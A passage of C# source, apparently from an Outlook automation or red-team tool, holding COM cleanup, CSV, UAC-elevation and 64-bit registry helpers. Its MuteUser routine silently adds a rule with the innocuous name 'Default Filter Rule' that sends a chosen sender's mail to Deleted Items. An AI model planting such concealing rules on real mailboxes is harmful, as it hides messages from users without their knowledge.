                return;
            }

            catch
            { }
        }

        //http://www.techmikael.com/2010/11/creating-zip-files-with.html
        private static void CopyStream(Stream source, Stream target)
        {
            const int bufSize = 16384;
            byte[] buf = new byte[bufSize];
            int bytesRead = 0;
            while ((bytesRead = source.Read(buf, 0, bufSize)) > 0)
                target.Write(buf, 0, bytesRead);
        }

        private static Uri GetRelativeUri(string currentFile)
        {
            string relPath = currentFile.Substring(currentFile
            .IndexOf('\\')).Replace('\\', '/').Replace(' ', '_');
            return new Uri(RemoveAccents(relPath), UriKind.Relative);
        }

        private static string RemoveAccents(string input)
        {
            string normalized = input.Normalize(NormalizationForm.FormKD);
            Encoding removal = Encoding.GetEncoding(Encoding.ASCII.CodePage, new EncoderReplacementFallback(""), new DecoderReplacementFallback(""));
            byte[] bytes = removal.GetBytes(normalized);
            return Encoding.ASCII.GetString(bytes);
        }

        private static void MuteUser(string oMuteUser)
        {
            try
            {
                oOutlook = new gOutlook.Application();
                oNS = oOutlook.GetNamespace("MAPI");
                oCtFolder = oNS.GetDefaultFolder(gOutlook.OlDefaultFolders.olFolderDeletedItems);
                oRules = oOutlook.Session.DefaultStore.GetRules();
                bool oRuleExists = false;
                bool oUserExists = false;

                string oRuleName = "Default Filter Rule";

                foreach (gOutlook.Rule oRule in oRules)
                {
                    if (oRule.Name == "Default Filter Rule")
                    {
                        oRuleExists = true;
                        oRecips = oRule.Conditions.From.Recipients;

                        foreach (gOutlook.Recipient oRecip in oRecips)
                        {
                            oPA = oRecip.PropertyAccessor;
                            if (oPA.GetProperty("http://schemas.microsoft.com/mapi/proptag/0x39FE001E").ToString() == oMuteUser) oUserExists = true;
                        }

                        if (oUserExists == false)
                        {
                            oRule.Conditions.From.Recipients.Add(oMuteUser);
                            oRule.Conditions.From.Recipients.ResolveAll();
                            oRule.Conditions.From.Enabled = true;
                            oRule.Actions.MoveToFolder.Folder = oCtFolder;
                            oRule.Actions.MoveToFolder.Enabled = true;
                            oRule.Enabled = true;
                            oRules.Save();
                        }
                    }
                }
                if (oRuleExists == false)
                {
                    oRule = oRules.Create(oRuleName, gOutlook.OlRuleType.olRuleReceive);
                    oRule.Conditions.From.Recipients.Add(oMuteUser);
                    oRule.Conditions.From.Recipients.ResolveAll();
                    oRule.Conditions.From.Enabled = true;
                    oRule.Actions.MoveToFolder.Folder = oCtFolder;
                    oRule.Actions.MoveToFolder.Enabled = true;
                    oRule.Enabled = true;
                    oRules.Save();
                }
            }
            catch
            { }
            finally
            {
                CleanUp();
            }
        }

        private static void CleanUp()
        {
            // Manually clean up the explicit unmanaged Outlook COM resources by  
            // calling Marshal.FinalReleaseComObject on all accessor objects. 
            // See http://support.microsoft.com/kb/317109.

            //errorlog.Close();

            if (oMail != null)
            {
                Marshal.FinalReleaseComObject(oMail);
                oMail = null;
            }
            if (oCts != null)
            {
                Marshal.FinalReleaseComObject(oCts);
                oCts = null;
            }
            if (oRoot != null)
            {
                Marshal.FinalReleaseComObject(oRoot);
                oRoot = null;
            }
            if (oNS != null)
            {
                Marshal.FinalReleaseComObject(oNS);
                oNS = null;
            }
            if (oOutlook != null)
            {
                Marshal.FinalReleaseComObject(oOutlook);
                oOutlook = null;
            }
            if (oCtFolder != null)
            {
                Marshal.FinalReleaseComObject(oCtFolder);
                oCtFolder = null;
            }
            if (oNewFolder != null)
            {
                Marshal.FinalReleaseComObject(oNewFolder);
                oNewFolder = null;
            }
            if (oRecips != null)
            {
                Marshal.FinalReleaseComObject(oRecips);
                oRecips = null;
            }
            if (oRecip != null)
            {
                Marshal.FinalReleaseComObject(oRecip);
                oRecip = null;
            }
            if (oExchangeUser != null)
            {
                Marshal.FinalReleaseComObject(oExchangeUser);
                oExchangeUser = null;
            }
            if (oExchangeManager != null)
            {
                Marshal.FinalReleaseComObject(oExchangeManager);
                oExchangeManager = null;
            }
            if (oExchangeAEntries != null)
            {
                Marshal.FinalReleaseComObject(oExchangeAEntries);
                oExchangeAEntries = null;
            }
            if (oExchangeAEntry != null)
            {
                Marshal.FinalReleaseComObject(oExchangeAEntry);
                oExchangeAEntry = null;
            }
            if (oAttach != null)
            {
                Marshal.FinalReleaseComObject(oAttach);
                oAttach = null;
            }
            if (oRules != null)
            {
                Marshal.FinalReleaseComObject(oRules);
                oRules = null;
            }
            if (oRule != null)
            {
                Marshal.FinalReleaseComObject(oRule);
                oRule = null;
            }
            if (oPA != null)
            {
                Marshal.FinalReleaseComObject(oPA);
                oPA = null;
            }
        }
    }

    public class CsvRow : List<string>
    {
        public string LineText { get; set; }
    }

    public class CsvFileWriter : StreamWriter
    {
        public CsvFileWriter(Stream stream)
            : base(stream)
        {
        }

        public CsvFileWriter(string filename)
            : base(filename)
        {
        }

        /// <summary>
        /// Writes a single row to a CSV file.
        /// </summary>
        /// <param name="row">The row to be written</param>
        public void WriteRow(CsvRow row)
        {
            StringBuilder builder = new StringBuilder();
            bool firstColumn = true;
            foreach (string value in row)
            {
                // Add separator if this isn't the first value
                if (!firstColumn)
                    builder.Append(',');
                // Implement special handling for values that contain comma or quote
                // Enclose in quotes and double up any double quotes
                if (value.IndexOfAny(new char[] { '"', ',' }) != -1)
                    builder.AppendFormat("\"{0}\"", value.Replace("\"", "\"\""));
                else
                    builder.Append(value);
                firstColumn = false;
            }
            row.LineText = builder.ToString();
            WriteLine(row.LineText);
        }
    }

    //https://stackoverflow.com/questions/1220213/detect-if-running-as-administrator-with-or-without-elevated-privileges
    public class UacHelper
    {
        private const string uacRegistryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
        private const string uacRegistryValue = "EnableLUA";

        private static uint STANDARD_RIGHTS_READ = 0x00020000;
        private static uint TOKEN_QUERY = 0x0008;
        private static uint TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);

        public enum TOKEN_INFORMATION_CLASS
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUIAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        public enum TOKEN_ELEVATION_TYPE
        {
            TokenElevationTypeDefault = 1,
            TokenElevationTypeFull,
            TokenElevationTypeLimited
        }

        public static bool IsUacEnabled
        {
            get
            {
                RegistryKey uacKey = Registry.LocalMachine.OpenSubKey(uacRegistryKey, false);
                bool result = uacKey.GetValue(uacRegistryValue).Equals(1);
                return result;
            }
        }

        public static bool IsProcessElevated(Process oProcess)
        {
            if (IsUacEnabled)
            {
                IntPtr tokenHandle;

                if (!OpenProcessToken(oProcess.Handle, TOKEN_READ, out tokenHandle))
                {
                    throw new ApplicationException("Could not get process token.  Win32 Error Code: " + Marshal.GetLastWin32Error());
                }

                TOKEN_ELEVATION_TYPE elevationResult = TOKEN_ELEVATION_TYPE.TokenElevationTypeDefault;

                int elevationResultSize = Marshal.SizeOf((int)elevationResult);
                uint returnedSize = 0;
                IntPtr elevationTypePtr = Marshal.AllocHGlobal(elevationResultSize);

                bool success = GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, elevationTypePtr, (uint)elevationResultSize, out returnedSize);
                if (success)
                {
                    elevationResult = (TOKEN_ELEVATION_TYPE)Marshal.ReadInt32(elevationTypePtr);
                    bool isProcessAdmin = elevationResult == TOKEN_ELEVATION_TYPE.TokenElevationTypeFull;
                    return isProcessAdmin;
                }
                else
                {
                    throw new ApplicationException("Unable to determine the current elevation.");
                }
            }
            else
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                bool result = principal.IsInRole(WindowsBuiltInRole.Administrator);
                return result;
            }
        }
    }

    //https://www.rhyous.com/2011/01/24/how-read-the-64-bit-registry-from-a-32-bit-application-or-vice-versa/
    //I had to cut it up a little bit to get the DWORD
    public static class RegHive
    {
        public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        public static UIntPtr HKEY_CURRENT_USER = new UIntPtr(0x80000001u);
    }

    public static class RegistryWOW6432
    {
        #region Member Variables
        #region Read 64bit Reg from 32bit app
        public static UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        public static UIntPtr HKEY_CURRENT_USER = new UIntPtr(0x80000001u);

        [DllImport("Advapi32.dll")]
        static extern uint RegOpenKeyEx(
            UIntPtr hKey,
            string lpSubKey,
            uint ulOptions,
            int samDesired,
            out int phkResult);

        [DllImport("Advapi32.dll")]
        static extern uint RegCloseKey(int hKey);

        [DllImport("advapi32.dll", EntryPoint = "RegQueryValueEx")]
        public static extern int RegQueryValueEx(
            int hKey,
            string lpValueName,
            int lpReserved,
            ref RegistryValueKind lpType,
            StringBuilder lpData,
            ref uint lpcbData);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "RegQueryValueEx")]
        private static extern int RegQueryValueEx(
            int hKey,
            string lpValueName,
            int lpReserved,
            ref RegistryValueKind lpType,
            [Out] byte[] lpData,
            ref uint lpcbData);
        #endregion
        #endregion

        #region Functions

        public static byte[] GetRegKey64AsByteArray(UIntPtr inHive, String inKeyName, String inPropertyName)
        {
            return GetRegKey64AsByteArray(inHive, inKeyName, RegSAM.WOW64_64Key, inPropertyName);
        }

        static public byte[] GetRegKey64AsByteArray(UIntPtr inHive, String inKeyName, RegSAM in32or64key, String inPropertyName)
        {
            int hkey = 0;

            try
            {
                uint lResult = RegOpenKeyEx(inHive, inKeyName, 0, (int)RegSAM.QueryValue | (int)in32or64key, out hkey);
                if (0 != lResult) return null;
                RegistryValueKind lpType = 0;
                uint lpcbData = 2048;

                // Just make a big buffer the first time
                byte[] byteBuffer = new byte[1000];
                // The first time, get the real size
                RegQueryValueEx(hkey, inPropertyName, 0, ref lpType, byteBuffer, ref lpcbData);
                // Now create a correctly sized buffer
                byteBuffer = new byte[lpcbData];
                // now get the real value
                RegQueryValueEx(hkey, inPropertyName, 0, ref lpType, byteBuffer, ref lpcbData);

                return byteBuffer;
            }
            finally
            {
                if (0 != hkey) RegCloseKey(hkey);
            }
        }
        #endregion

        #region Enums
        public enum RegSAM
        {
            QueryValue = 0x0001,
            SetValue = 0x0002,
            CreateSubKey = 0x0004,
            EnumerateSubKeys = 0x0008,
            Notify = 0x0010,
            CreateLink = 0x0020,
            WOW64_32Key = 0x0200,
            WOW64_64Key = 0x0100,
            WOW64_Res = 0x0300,
            Read = 0x00020019,
            Write = 0x00020006,
            Execute = 0x00020019,
            AllAccess = 0x000f003f
        }
        #endregion
    }
}
